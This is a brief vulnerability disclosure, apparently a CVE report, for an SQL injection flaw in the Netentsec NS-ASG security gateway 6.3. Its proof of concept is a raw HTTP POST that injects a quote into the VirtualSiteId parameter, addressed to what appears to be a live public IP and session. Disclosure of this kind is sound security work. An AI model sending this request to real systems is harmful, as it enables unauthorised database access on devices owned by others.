Beijing Wangkang Technology Co., Ltd. is a leading provider of network application management equipment in China, focusing on the latest trend research and analysis in the field of network application management. It provides users with advanced network application management technology, products, and solutions, aiming to help users achieve the goal of "using the internet well" in network management.

There is an SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.

official： https://www.netentsec.com/

version:6.3 Vulnerability Path ： /admin/edit_virtual_site_info.php

poc:
```
POST /admin/edit_virtual_site_info.php HTTP/1.1
Host: 218.75.78.54:4443
Cookie: PHPSESSID=bed72fc51349b92a0462eecbc5ff96d8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

&action=restitute&VirtualSiteId=1'
```
<img width="632" alt="图片" src="https://github.com/charliecatsec/cve1/assets/171440363/73a50935-16fa-4556-8379-e53053e35c6b">

<img width="602" alt="图片" src="https://github.com/charliecatsec/cve1/assets/171440363/fc792a62-3e89-446e-adb7-df94443b4cd1">


